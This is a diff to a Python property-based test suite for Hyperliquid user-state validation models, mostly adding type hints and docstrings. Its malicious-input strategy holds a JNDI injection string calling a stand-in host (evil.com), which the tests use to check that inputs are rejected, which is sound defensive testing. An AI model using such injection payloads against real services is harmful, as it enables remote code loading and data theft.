@@ -1,7 +1,8 @@
 """Property-based tests for Hyperliquid raw user state models.
 
 These tests validate critical security boundary models that process external user state data.
-The models tested here are essential for user account tracking, position management, and margin calculations.
+The models tested here are essential for user account tracking, position
+management, and margin calculations.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious user state data that could manipulate account balances and positions
@@ -15,11 +16,12 @@ Property testing ensures comprehensive coverage of user state edge cases and adv
 """
 
 import json
+import string
 from decimal import Decimal
-from typing import Any
+from typing import Any, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
@@ -40,8 +42,25 @@ from cyberdelta.exceptions.parsing import EmptyStringError
 # =============================================================================
 
 
+def _format_ethereum_address(prefix: str, hex_part: str) -> str:
+    """Format Ethereum address from prefix and hex part.
+    
+    Args:
+        prefix: Address prefix (usually '0x')
+        hex_part: Hexadecimal part of the address
+        
+    Returns:
+        Formatted Ethereum address
+    """
+    return f"{prefix}{hex_part}"
+
+
 def leverage_type_strategy() -> SearchStrategy[str]:
-    """Generate valid leverage type strings."""
+    """Generate valid leverage type strings.
+
+    Returns:
+        A Hypothesis strategy for valid leverage type strings.
+    """
     return st.sampled_from([
         "cross",
         "isolated",
@@ -49,7 +68,11 @@ def leverage_type_strategy() -> SearchStrategy[str]:
 
 
 def coin_strategy() -> SearchStrategy[str]:
-    """Generate valid coin/asset strings."""
+    """Generate valid coin/asset strings.
+
+    Returns:
+        A Hypothesis strategy for valid coin/asset strings.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -86,7 +109,11 @@ def coin_strategy() -> SearchStrategy[str]:
 
 
 def user_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum-like addresses for user field."""
+    """Generate valid Ethereum-like addresses for user field.
+
+    Returns:
+        A Hypothesis strategy for valid Ethereum-like address strings.
+    """
     return st.one_of([
         # Valid Ethereum addresses
         st.just("0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9"),
@@ -94,19 +121,23 @@ def user_address_strategy() -> SearchStrategy[str]:
         st.just("0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"),
         # Generated addresses
         st.builds(
-            lambda prefix, hex_part: f"{prefix}{hex_part}",
+            _format_ethereum_address,
             st.just("0x"),
-            st.text(min_size=40, max_size=40, alphabet="0123456789abcdefABCDEF"),
+            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def financial_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for financial values (account value, PnL, etc.)."""
+    """Generate decimal strings for financial values (account value, PnL, etc.).
+
+    Returns:
+        A Hypothesis strategy for financial decimal strings.
+    """
     return st.one_of([
         # Common financial values
-        st.decimals(min_value=Decimal("-1000000"), max_value=Decimal("1000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("-100000"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
         # Common values
         st.just("0"),  # Zero value
         st.just("0.0"),  # Zero with decimal
@@ -123,11 +154,15 @@ def financial_decimal_strategy() -> SearchStrategy[str]:
 
 
 def non_negative_financial_decimal_strategy() -> SearchStrategy[str]:
-    """Generate non-negative decimal strings for margin values."""
+    """Generate non-negative decimal strings for margin values.
+
+    Returns:
+        A Hypothesis strategy for non-negative financial decimal strings.
+    """
     return st.one_of([
         # Non-negative financial values
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(100000), places=6).map(str),
         # Common values
         st.just("0"),  # Zero value
         st.just("0.0"),  # Zero with decimal
@@ -142,8 +177,12 @@ def non_negative_financial_decimal_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_leverage_data(draw) -> dict[str, Any]:
-    """Generate valid leverage data."""
+def valid_leverage_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid leverage data.
+
+    Returns:
+        A dictionary with valid leverage data fields.
+    """
     return {
         "type": draw(leverage_type_strategy()),
         "value": draw(st.integers(min_value=0, max_value=100)),
@@ -151,8 +190,12 @@ def valid_leverage_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_margin_summary_data(draw) -> dict[str, Any]:
-    """Generate valid margin summary data."""
+def valid_margin_summary_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid margin summary data.
+
+    Returns:
+        A dictionary with valid margin summary data fields.
+    """
     return {
         "accountValue": draw(financial_decimal_strategy()),
         "totalMarginUsed": draw(non_negative_financial_decimal_strategy()),
@@ -162,8 +205,12 @@ def valid_margin_summary_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_position_info_data(draw) -> dict[str, Any]:
-    """Generate valid position info data."""
+def valid_position_info_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid position info data.
+
+    Returns:
+        A dictionary with valid position info data fields.
+    """
     entry_px = draw(st.one_of([st.none(), financial_decimal_strategy()]))
     liquidation_px = draw(st.one_of([st.none(), financial_decimal_strategy()]))
 
@@ -182,8 +229,12 @@ def valid_position_info_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_asset_position_data(draw) -> dict[str, Any]:
-    """Generate valid asset position data."""
+def valid_asset_position_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid asset position data.
+
+    Returns:
+        A dictionary with valid asset position data fields.
+    """
     asset = draw(st.one_of([st.none(), coin_strategy()]))
     position_type = draw(st.one_of([st.none(), st.sampled_from(["spot", "perp"])]))
 
@@ -195,8 +246,12 @@ def valid_asset_position_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_clearinghouse_state_data(draw) -> dict[str, Any]:
-    """Generate valid clearinghouse state data."""
+def valid_clearinghouse_state_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid clearinghouse state data.
+
+    Returns:
+        A dictionary with valid clearinghouse state data fields.
+    """
     isolated_maintenance_margin_used = draw(
         st.one_of([st.none(), non_negative_financial_decimal_strategy()])
     )
@@ -216,16 +271,24 @@ def valid_clearinghouse_state_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_user_state_request_data(draw) -> dict[str, Any]:
-    """Generate valid user state request payload data."""
+def valid_user_state_request_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid user state request payload data.
+
+    Returns:
+        A dictionary with valid user state request payload data fields.
+    """
     return {
         "type": "clearinghouseState",
         "user": draw(user_address_strategy()),
     }
 
 
-def malicious_user_state_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for user state security testing."""
+def malicious_user_state_strategy() -> SearchStrategy[object]:
+    """Generate malicious values for user state security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # User state manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-state}"),
@@ -276,7 +339,11 @@ class TestHyperliquidRawLeverageProperties:
 
     @given(leverage_data=valid_leverage_data())
     def test_leverage_validation_success_properties(self, leverage_data: dict[str, Any]) -> None:
-        """Property: Valid leverage data should always create valid HyperliquidRawLeverage objects."""
+        """Property: Valid leverage data should always create valid HyperliquidRaw.
+        
+        Leverage
+        objects.
+        """
         obj = HyperliquidRawLeverage.model_validate(leverage_data)
 
         # Property: Object should be created successfully
@@ -296,10 +363,10 @@ class TestHyperliquidRawLeverageProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_leverage_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Leverage model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | int | object] = {
             "type": "cross",
             "value": 5,
         }
@@ -390,7 +457,11 @@ class TestHyperliquidRawMarginSummaryProperties:
     def test_margin_summary_validation_success_properties(
         self, margin_data: dict[str, Any]
     ) -> None:
-        """Property: Valid margin summary data should always create valid HyperliquidRawMarginSummary objects."""
+        """Property: Valid margin summary data should always create valid HyperliquidRaw.
+        
+        MarginSummary
+        objects.
+        """
         # Skip invalid data
         for field in ["accountValue", "totalMarginUsed", "totalNtlPos", "totalRawUsd"]:
             value = margin_data[field]
@@ -424,10 +495,10 @@ class TestHyperliquidRawMarginSummaryProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_margin_summary_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Margin summary model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "accountValue": "1000.0",
             "totalMarginUsed": "100.0",
             "totalNtlPos": "200.0",
@@ -542,7 +613,11 @@ class TestHyperliquidRawPositionInfoProperties:
     def test_position_info_validation_success_properties(
         self, position_data: dict[str, Any]
     ) -> None:
-        """Property: Valid position info data should always create valid HyperliquidRawPositionInfo objects."""
+        """Property: Valid position info data should always create valid HyperliquidRaw.
+        
+        PositionInfo
+        objects.
+        """
         # Skip invalid data
         try:
             # Validate required string fields
@@ -604,10 +679,10 @@ class TestHyperliquidRawPositionInfoProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_position_info_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Position info model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | dict[str, str | int] | int | object] = {
             "coin": "ETH",
             "entryPx": "1234.56",
             "leverage": {"type": "cross", "value": 5},
@@ -675,7 +750,11 @@ class TestHyperliquidRawAssetPositionProperties:
     def test_asset_position_validation_success_properties(
         self, asset_position_data: dict[str, Any]
     ) -> None:
-        """Property: Valid asset position data should always create valid HyperliquidRawAssetPosition objects."""
+        """Property: Valid asset position data should always create valid HyperliquidRaw.
+        
+        AssetPosition
+        objects.
+        """
         # Skip invalid data
         try:
             # Validate position data
@@ -703,10 +782,10 @@ class TestHyperliquidRawAssetPositionProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_asset_position_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Asset position model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "asset": "ETH",
             "position": {
                 "coin": "ETH",
@@ -764,7 +843,11 @@ class TestHyperliquidRawClearinghouseStateProperties:
     def test_clearinghouse_state_validation_success_properties(
         self, state_data: dict[str, Any]
     ) -> None:
-        """Property: Valid clearinghouse state data should always create valid HyperliquidRawClearinghouseState objects."""
+        """Property: Valid clearinghouse state data should always create valid HyperliquidRaw.
+        
+        ClearinghouseState
+        objects.
+        """
         # Skip invalid data
         try:
             # Validate required decimal fields
@@ -826,10 +909,10 @@ class TestHyperliquidRawClearinghouseStateProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_clearinghouse_state_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Clearinghouse state model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, Any] = {
             "assetPositions": [],
             "marginSummary": {
                 "accountValue": "1000.0",
@@ -854,7 +937,7 @@ class TestHyperliquidRawClearinghouseStateProperties:
             "withdrawable": "50.00",
             "time": 1641886630,
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -898,7 +981,11 @@ class TestHyperliquidRawUserStateRequestPayloadProperties:
     def test_user_state_request_validation_success_properties(
         self, request_data: dict[str, Any]
     ) -> None:
-        """Property: Valid user state request data should always create valid HyperliquidRawUserStateRequestPayload objects."""
+        """Property: Valid user state request data should always create valid HyperliquidRaw.
+        
+        UserStateRequestPayload
+        objects.
+        """
         obj = HyperliquidRawUserStateRequestPayload.model_validate(request_data)
 
         # Property: Object should be created successfully
@@ -913,10 +1000,10 @@ class TestHyperliquidRawUserStateRequestPayloadProperties:
         malicious_value=malicious_user_state_strategy(),
     )
     def test_user_state_request_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: User state request model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "clearinghouseState",
             "user": "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
         }
@@ -966,7 +1053,7 @@ class TestHyperliquidRawUserStateIntegrationProperties:
         malicious_position=malicious_user_state_strategy(),
     )
     def test_user_state_models_integration_properties(
-        self, state_data: dict[str, Any], malicious_position: Any
+        self, state_data: dict[str, Any], malicious_position: object
     ) -> None:
         """Property: User state models should work consistently together."""
         # Skip invalid data
@@ -1012,7 +1099,8 @@ class TestHyperliquidRawUserStateIntegrationProperties:
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
         """Property: All user state models should safely handle complete adversarial input."""
-        # Property: Complete adversarial input should be safely rejected by clearinghouse state model
+        # Property: Complete adversarial input should be safely rejected by clearinghouse state
+        # model
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawClearinghouseState.model_validate(complete_malicious_data)
 
@@ -1032,7 +1120,8 @@ class TestHyperliquidRawUserStateIntegrationProperties:
         try:
             # Validate leverage
             assume(leverage_data.get("type") in ["cross", "isolated"])
-            assume(isinstance(leverage_data.get("value"), int) and leverage_data.get("value") >= 0)
+            leverage_value = leverage_data.get("value")
+            assume(isinstance(leverage_value, int) and leverage_value >= 0)
 
             # Validate position
             assume(
@@ -1198,7 +1287,7 @@ def test_HyperliquidRawUserStateRequestPayload_real_world_example() -> None:
 
 def test_HyperliquidRawClearinghouseState_empty_positions_example() -> None:
     """Test with empty asset positions."""
-    payload = {
+    payload: dict[str, Any] = {
         "assetPositions": [],
         "marginSummary": {
             "accountValue": "0",
